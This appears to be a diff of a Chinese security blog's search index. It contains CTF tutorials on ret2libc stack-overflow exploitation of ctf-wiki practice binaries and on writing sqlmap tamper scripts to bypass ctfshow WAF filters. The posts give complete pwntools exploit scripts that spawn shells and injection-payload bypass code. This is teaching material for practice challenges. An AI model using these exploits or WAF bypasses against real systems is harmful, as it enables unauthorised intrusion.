class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行后成功获得shell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/1%5DS3L3IFJ4%5DZST2%5DPW%7D%280%40L.png" alt=""></p>
+<h3 id="ret2libc"><a class="header-anchor" href="#ret2libc">¶</a>ret2libc</h3>
+<p>ret2libc 简单来说就是使我们的 ret 不跳转到 vuln 或者 shellcode 上，而是跳转到了某个函数的 plt 或者该函数对应的 got 表内容，从而控制函数去执行 libc 中的函数，一般情况下使用<code>system(&quot;/bin/sh&quot;)</code><br>
+在 wiki 中，一共给了三道题，分别对应不同情况</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、有system 有&#x2F;bin&#x2F;sh</span><br><span class="line">2、有system 无&#x2F;bin&#x2F;sh</span><br><span class="line">3、无system 无&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<h4 id="有system-有-bin-sh"><a class="header-anchor" href="#有system-有-bin-sh">¶</a>有system 有/bin/sh</h4>
+<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a><br>
+首先检查文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/9HRBC9%25YE%7D8Q17J%60C2LX%25%29I.png" alt=""><br>
+32位程序，并且开启了 NX 保护，用 ida 查看</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>典型的栈溢出，看到有 system 函数<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/%7D%29DP%40%5B%25%29AXFZ%7B%28%40U%2839%5DS%40Y.png" alt=""><br>
+地址为<code>0x08048460</code>，接着查找 /bin/sh 的地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/J_9Y7HZ%28M%7B6AFHV%7BT%40RSZQ0.png" alt=""><br>
+地址为<code>0x08048720</code>，然后找偏移大小<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/CZ%4083DE_V8BFQQ_RJF%5B%25P_J.png" alt=""><br>
+大小为112，可以写exp了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">system_a = <span class="number">0x08048460</span></span><br><span class="line">bin_sh_a = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment">#因为是调用system函数，所以需要给一个返回地址，我们随意写一个虚假的地址即可</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_a) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(bin_sh_a)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行后获取shell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/G%29KM4E5G%29%7B9O132DF7DLB7Y.png" alt=""></p>
+<h4 id="有system-无-bin-sh"><a class="header-anchor" href="#有system-无-bin-sh">¶</a>有system 无/bin/sh</h4>
+<p>这次在ida中查看，发现没有 /bin/sh 字符串，但是 main 中有 gets</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并且 plt 端中也有gets 函数<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/~Y%5DSUM%5BY%40%7D50HU4%603JVVH9E.png" alt=""><br>
+所以思路就是，如果 bss 段可写，我们就通过 gets 接收我们输入的<code>/bin/sh</code>字符串，然后写入到 bss 段中，接着跳转到 system 函数中执行，整个流程图如图所示<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/9V22.png" alt=""><br>
+我们先去看一下 bss 段地址<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/42Q0A_2MJ8G%291NT9UMS%28C2H.png" alt=""><br>
+为<code>0x0804A080</code>，我们用 gdb 查看一下是否具有可写的权限<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/48T%29MSPIXSFJP%7B%7BA0NW_%284X.png" alt=""><br>
+可以看到该区间是具有可写的权限，栈空间由之前的办法求得为112，所以可以写exp了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#因为/bin/sh是写到bss段中，所以地址一样</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(get_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行后成功获取shell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/%603A2M3A9NZM%28RDF2%7DCQT%245U.png" alt=""></p>
+<h4 id="无system-无-bin-sh"><a class="header-anchor" href="#无system-无-bin-sh">¶</a>无system 无/bin/sh</h4>
+<p>在前面的基础上，再次将 system 函数地址去掉，所以这次我们需要同时找到 system 和 /bin/sh<br>
+点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a><br>
+首先检查文件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/3/DI%60H%2979%251TX%25ET9HB%5DIKPAQ.png" alt=""><br>
+依然开启了 NX 堆栈不可执行保护，放进 ida 中查看源码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是典型的 gets 栈溢出漏洞，没有 system 和 /bin/sh ，我们可以使用 libc 中的 system 和 /bin/sh。如果我们知道了 libc 中的某一个函数地址就可以确定该程序使用的libc版本，从而知道其他函数的地址。</p>
+<blockquote>
+<p>获得libc的某个函数地址通常使用 got 表泄露的方式（即输出某个函数对应的got表项内容），但是由于 libc 的延迟绑定，我们需要泄露的是已经执行过的函数地址</p>
+</blockquote>
+<p>在 main 函数中我们可以看到执行了 puts，所以我们思路如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.先通过一次栈溢出，将puts的plt地址放到返回处，通过代码中的puts(输出)功能泄露出执行过的函数(puts)的got地址</span><br><span class="line"></span><br><span class="line">2.将puts的返回地址设置为_start函数（我们在ida中看到的main()函数是用户代码的入口，是对于用户而言），而start函数是系统代码入口，是程序最初被执行的地方，也就是程序真正的入口），以用来执行system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">3.通过泄露出的got地址计算出libc中的system和&#x2F;bin&#x2F;sh的地址</span><br><span class="line"></span><br><span class="line">4.再次执行栈溢出，把返回地址换成system的地址达到getshell</span><br></pre></td></tr></table></figure>
+<p>编写exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"><span class="comment">#从程序中获取puts的plt和got以及_start地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="comment">#第一次栈溢出，puts函数输出puts_got，即got的地址</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#使用题目的libc</span></span><br><span class="line">libc = elf.libc</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#第二次栈溢出，执行system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行后成功 getshell<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/3/OC%5B_OJ%5D_%7DX%5DFJ%5BL%5D%7B0PB%6094.png" alt=""></p>
+<p>上面说的都是32位程序，而在64位程序中函数的调用栈是不同的，这也是我们写 payload 时需要注意的地方</p>
+<blockquote>
+<ul>
+<li>32位程序
+<ul>
+<li><strong>函数参数</strong> 在 <strong>函数返回地址</strong> 的上方</li>
+</ul>
+</li>
+<li>64位程序
+<ul>
+<li>采用寄存器传参，所以我们需要覆盖寄存器</li>
+<li>前六个参数按顺序存储在寄存器 rdi, rsi, rdx, rcx, r8, r9 中，参数超过六个时，从第七个开始压入栈中</li>
+<li>内存地址不能大于 0x00007FFFFFFFFFFF， <strong>6 个字节长度</strong> ，否则会抛出异常。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
+<p>继续努力学习，后面遇见新的知识点会继续补充这篇文章</p>
+<blockquote>
+<p>参考链接：<br>
+<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a><br>
+<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5">https://www.yuque.com/hxfqg9/bin/ug9gx5</a></p>
+</blockquote>
 ]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
   <entry>
     <title>pwn新手入门之格式化字符串漏洞</title>
@@ -1958,6 +2158,54 @@ is_numeric()：   用于检测变量是否为数字或数字字符串</p>
 <a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a><br>
 <a href="https://www.yuque.com/hxfqg9/bin/aedgn4">https://www.yuque.com/hxfqg9/bin/aedgn4</a></p>
 </blockquote>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap-tamper编写初体验</title>
+    <url>/posts/3501/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>最近做ctf题，到了编写tamper脚本的阶段，写一篇基础浅薄的文章记录一下，新手如何上手tamper脚本的编写</p>
+<h2 id="介绍"><a class="header-anchor" href="#介绍">¶</a>介绍</h2>
+<p>tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的，而tamper文件在sqlmap文件夹下的tamper文件夹中。我们取一个<code>base64encode.py</code>文件来观察其结构</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到，分别有<code>import</code>、<code>__priority__</code>属性、<code>dependencies</code>函数和<code>tamper</code>函数</p>
+<h3 id="import"><a class="header-anchor" href="#import">¶</a>import</h3>
+<p>这一部分不用多说大家也都知道，就是导入python库或者sqlmap的内部库。其中sqlmap为我们封装了很多函数，我们可以在lib文件中的core文件夹查看。</p>
+<h3 id="priority"><a class="header-anchor" href="#priority">¶</a>priority</h3>
+<p>PRIORITY是从slqmap自己封装的库中导入，我们去查看enums.py文件可以看到以下内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    LOWEST = -<span class="number">100</span></span><br><span class="line">    LOWER = -<span class="number">50</span></span><br><span class="line">    LOW = -<span class="number">10</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    HIGH = <span class="number">10</span></span><br><span class="line">    HIGHER = <span class="number">50</span></span><br><span class="line">    HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
+<p>这里是定义优先级的意思，如果有多个tamper脚本同时使用，会按照优先级顺序进行先后调用</p>
+<h3 id="dependencies"><a class="header-anchor" href="#dependencies">¶</a>dependencies</h3>
+<p>dependencies的作用主要是进行提示，上述案例没有作提示就用了pass跳过，我们写个简单提示的例子</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;我是提示哦，这个tamper的作用是进行base64编码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
+<p>然后在tamper文件夹下保存成<code>dotast.py</code>，以<code>--tamper=dotast</code>的方式引用<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/R52GSK9JAVUG_KVAVRKAR62.png" alt=""><br>
+可以看到弹出了我们编写的提示</p>
+<h3 id="tamper"><a class="header-anchor" href="#tamper">¶</a>tamper</h3>
+<p>tamper函数是整个tamper脚本的核心，你想实现的功能都写在此函数里边。他有两个参数，一个是payload，一个是kwargs。payload是sqlmap的注入payload，想要bypass绕过就对此修改；kwargs是对于http头部的修改。</p>
+<h2 id="编写案例"><a class="header-anchor" href="#编写案例">¶</a>编写案例</h2>
+<h3 id="案例一"><a class="header-anchor" href="#案例一">¶</a>案例一</h3>
+<p>这里举例ctfshow的web208题<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/A_O%6028%2499%605SCVX%25ND9%28193.png" alt=""></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到waf的逻辑是ban了小写select和空格,我们编写对应绕过的tamper脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;绕过小写select和空格&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;把空格替换成注释符绕过&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload[i]== <span class="string">&quot; &quot;</span>:</span><br><span class="line">            result +=<span class="string">&quot;/**/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result +=payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;小写替换成大写,这一步可以不用，因为slqmap默认payload就是大写的&quot;&quot;&quot;</span></span><br><span class="line">    result = result.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;SELECT&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们再引入编写好的<code>dotast.py</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/IA%5DK%5D0YW2%28I4NOF3O_P%7B86S.png" alt=""></p>
+<h3 id="案例二"><a class="header-anchor" href="#案例二">¶</a>案例二</h3>
+<p>再举例ctfshow的web210题<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/F5FJ61UXLCJJ%7DAS9DKP10%5BM.png" alt=""><br>
+waf逻辑如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看见是套娃的base64编码和字符串反转，我们按照他的逻辑反着写tamper脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;别套了别套了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::-<span class="number">1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+<p>然后再引入写好的tamper脚本<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/2J%60XSKK%25_8G2R%5B%40QHZ5%299ES.png" alt=""></p>
+<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
+<p>道阻且长，加油吧！</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -3793,369 +4041,6 @@ web82写的脚本改改直接用</p>
       </tags>
   </entry>
   <entry>
-    <title>sqlmap-tamper编写初体验</title>
-    <url>/posts/3501/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>最近做ctf题，到了编写tamper脚本的阶段，写一篇基础浅薄的文章记录一下，新手如何上手tamper脚本的编写</p>
-<h2 id="介绍"><a class="header-anchor" href="#介绍">¶</a>介绍</h2>
-<p>tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的，而tamper文件在sqlmap文件夹下的tamper文件夹中。我们取一个<code>base64encode.py</code>文件来观察其结构</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>可以看到，分别有<code>import</code>、<code>__priority__</code>属性、<code>dependencies</code>函数和<code>tamper</code>函数</p>
-<h3 id="import"><a class="header-anchor" href="#import">¶</a>import</h3>
-<p>这一部分不用多说大家也都知道，就是导入python库或者sqlmap的内部库。其中sqlmap为我们封装了很多函数，我们可以在lib文件中的core文件夹查看。</p>
-<h3 id="priority"><a class="header-anchor" href="#priority">¶</a>priority</h3>
-<p>PRIORITY是从slqmap自己封装的库中导入，我们去查看enums.py文件可以看到以下内容</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    LOWEST = -<span class="number">100</span></span><br><span class="line">    LOWER = -<span class="number">50</span></span><br><span class="line">    LOW = -<span class="number">10</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    HIGH = <span class="number">10</span></span><br><span class="line">    HIGHER = <span class="number">50</span></span><br><span class="line">    HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
-<p>这里是定义优先级的意思，如果有多个tamper脚本同时使用，会按照优先级顺序进行先后调用</p>
-<h3 id="dependencies"><a class="header-anchor" href="#dependencies">¶</a>dependencies</h3>
-<p>dependencies的作用主要是进行提示，上述案例没有作提示就用了pass跳过，我们写个简单提示的例子</p>
